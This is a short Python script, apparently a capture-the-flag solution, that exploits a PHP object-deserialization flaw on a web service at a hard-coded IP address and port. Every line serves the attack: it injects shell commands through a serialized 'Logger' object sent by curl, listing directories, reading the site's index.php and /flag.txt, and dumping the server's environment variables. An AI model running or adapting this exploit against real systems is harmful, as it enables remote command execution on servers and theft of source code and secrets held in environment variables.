import base64
import subprocess
from urllib.parse import quote

IP = "51.159.16.22"
PORT = "8045"

commands = [
    "ls /",
    "ls /var/www/html",
    "cat /var/www/html/index.php",
    "cat /flag.txt",
    "env",
]

for cmd in commands:
    payload = f'O:6:"Logger":1:{{s:3:"cmd";s:{len(cmd)}:"{cmd}";}}'.encode()
    b64 = base64.b64encode(payload).decode()
    print(f"\n--- {cmd} ---")
    url = f"http://{IP}:{PORT}/?data={quote(b64)}"
    result = subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    print(result.stdout)
